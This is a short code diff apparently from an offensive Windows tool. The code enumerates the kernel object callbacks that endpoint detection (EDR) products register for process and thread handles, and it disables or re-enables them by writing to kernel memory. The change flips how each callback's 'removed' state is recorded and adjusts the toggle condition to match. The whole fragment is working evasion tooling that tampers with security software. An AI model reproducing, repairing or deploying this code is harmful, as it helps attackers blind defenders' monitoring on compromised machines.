@@ -238,7 +238,7 @@ BOOL EnumEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS* FoundOb
                         struct KRNL_CALLBACK cb;
                         cb.type = OBJECT_CALLBACK;
                         cb.driver_name = driverNamePreOperation;
-						cb.removed = Enabled; //if Enabled --> will be removed, includeDisabled is irrelevant here
+						cb.removed = !Enabled;
                         cb.callback_func = PreOperation;
                         cb.addresses.object_callback.enable_addr = cbEntry + Offset_CALLBACK_ENTRY_ITEM_Enabled;
                         AddFoundKernelCallback(FoundObjectCallbacks, &cb);
@@ -288,7 +288,7 @@ void EnableDisableEDRProcessAndThreadObjectsCallbacks(struct FOUND_EDR_CALLBACKS
     }
     for (DWORD64 i = 0; i < FoundObjectCallbacks->size; i++) {
         struct KRNL_CALLBACK* cb = &FoundObjectCallbacks->EDR_CALLBACKS[i];
-		if (cb->type == OBJECT_CALLBACK && cb->removed != enable) { // only toggle if existing and desired state is different
+		if (cb->type == OBJECT_CALLBACK && cb->removed == enable) {
             _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\t%s %s callback...\n"), enable ? TEXT("Enabling") : TEXT("Disabling"), cb->driver_name);
             WriteMemoryDWORD(cb->addresses.object_callback.enable_addr, enable ? TRUE : FALSE);
             cb->removed = !cb->removed;
